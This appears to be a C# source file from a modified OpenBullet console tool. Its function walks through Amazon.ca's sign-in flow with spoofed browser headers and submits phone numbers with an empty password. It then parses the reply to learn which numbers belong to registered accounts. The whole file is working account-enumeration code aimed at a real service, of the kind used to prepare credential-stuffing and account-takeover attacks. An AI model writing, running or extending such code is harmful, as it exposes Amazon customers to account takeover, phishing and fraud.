using System;
using System.IO;
using System.Reflection;
using System.Threading.Tasks;

namespace OpenBullet_Console
{
	public static class OriginalEngine
	{
		public static async Task<ValidationResult?> ValidateWithOriginalStack(string phoneNumber, AmazonConfig config, bool debugMode)
		{
			try
			{
				var leafPaths = new[]
				{
					"/Users/BABY/Downloads/Projects/OpenBullet/Openbullet 1.4.4 Anomaly Modded Version/bin/Leaf.xNet.dll",
					Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "../libs/Leaf.xNet.dll"))
				};
				Assembly? leafAsm = null;
				foreach (var p in leafPaths) { if (File.Exists(p)) { leafAsm = Assembly.LoadFrom(p); break; } }
				if (leafAsm == null) return null;

				var httpRequestType = leafAsm.GetType("Leaf.xNet.HttpRequest");
				var httpResponseType = leafAsm.GetType("Leaf.xNet.HttpResponse");
				if (httpRequestType == null || httpResponseType == null) return null;

				var request = Activator.CreateInstance(httpRequestType);
				if (request == null) return null;

				SetProp(httpRequestType, request, "KeepAlive", true);
				SetProp(httpRequestType, request, "AllowAutoRedirect", true);
				SetProp(httpRequestType, request, "UseCookies", true);
				SetProp(httpRequestType, request, "AcceptEncoding", "gzip,deflate");
				SetProp(httpRequestType, request, "UserAgent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36");

				// Headers
				var addHeader = httpRequestType.GetMethod("AddHeader", new[] { typeof(string), typeof(string) });
				var headers = Program_GetAmazonHeaders();
				foreach (var h in headers)
				{
					try
					{
						var key = h.Key.ToLowerInvariant();
						if (key == "host" || key == "content-length") continue;
						addHeader?.Invoke(request, new object[] { h.Key, h.Value });
					}
					catch { }
				}

				string amazonUrl = config.TargetUrl ?? "https://www.amazon.ca/ap/signin";
				var getMethod = httpRequestType.GetMethod("Get", new[] { typeof(string) });
				var toStringMethod = httpResponseType.GetMethod("ToString", Type.EmptyTypes);
				string getContent = "";
				var getResp = getMethod!.Invoke(request, new object[] { amazonUrl });
				getContent = (string)toStringMethod!.Invoke(getResp!, Array.Empty<object>())!;

				var postData = Program_GetAmazonPostData(phoneNumber);
				if (string.IsNullOrEmpty(postData)) return null;
				var postStrMethod = httpRequestType.GetMethod("Post", new[] { typeof(string), typeof(string), typeof(string) });
				var firstResp = postStrMethod!.Invoke(request, new object[] { amazonUrl, postData, "application/x-www-form-urlencoded" });
				var firstHtml = (string)toStringMethod!.Invoke(firstResp!, Array.Empty<object>())!;

				// Continue
				var appActionToken = Program_ExtractFormValue(firstHtml, "appActionToken") ?? string.Empty;
				var workflowState = Program_ExtractFormValue(firstHtml, "workflowState") ?? string.Empty;
				var prevRID = Program_ExtractFormValue(firstHtml, "prevRID") ?? string.Empty;
				var continueData = string.Join("&", new[]
				{
					$"appActionToken={Uri.EscapeDataString(appActionToken)}",
					"appAction=SIGNIN_PWD_COLLECT",
					"subPageType=SignInClaimCollect",
					"openid.return_to=ape%3AaHR0cHM6Ly93d3cuYW1hem9uLmNhLz9yZWZfPW5hdl95YV9zaWduaW4%3D",
					$"prevRID={Uri.EscapeDataString(prevRID)}",
					$"workflowState={Uri.EscapeDataString(workflowState)}",
					$"email={Uri.EscapeDataString(phoneNumber)}",
					"password=",
					"create=0"
				});
				var contResp = postStrMethod!.Invoke(request, new object[] { amazonUrl, continueData, "application/x-www-form-urlencoded" });
				var contHtml = (string)toStringMethod!.Invoke(contResp!, Array.Empty<object>())!;

				var (isValid, detected, full) = Program_AnalyzeAmazonResponse(contHtml, phoneNumber, debugMode: debugMode);
				return new ValidationResult { PhoneNumber = phoneNumber, IsValid = isValid, DetectedKey = detected, FullMatchedText = full, ResponseContent = contHtml };
			}
			catch
			{
				return null;
			}
		}

		private static void SetProp(Type t, object o, string name, object? value)
		{
			try { t.GetProperty(name)?.SetValue(o, value); } catch { }
		}

		// Minimal bridges to Program's private methods via reflection (since we're in same assembly we can call directly)
		private static System.Collections.Generic.Dictionary<string,string> Program_GetAmazonHeaders()
		{
			return (System.Collections.Generic.Dictionary<string,string>) typeof(Program).GetMethod("GetAmazonHeaders", BindingFlags.NonPublic | BindingFlags.Static)!.Invoke(null, Array.Empty<object>())!;
		}
		private static string Program_GetAmazonPostData(string phone)
		{
			return (string) typeof(Program).GetMethod("GetAmazonPostData", BindingFlags.NonPublic | BindingFlags.Static)!.Invoke(null, new object[] { phone })!;
		}
		private static (bool,string,string) Program_AnalyzeAmazonResponse(string html, string phone, bool debugMode)
		{
			return ((bool,string,string)) typeof(Program).GetMethod("AnalyzeAmazonResponse", BindingFlags.NonPublic | BindingFlags.Static)!.Invoke(null, new object[] { html, phone, debugMode })!;
		}
		private static string? Program_ExtractFormValue(string html, string name)
		{
			return (string?) typeof(Program).GetMethod("ExtractFormValue", BindingFlags.NonPublic | BindingFlags.Static)!.Invoke(null, new object[] { html, name })!;
		}
	}
}

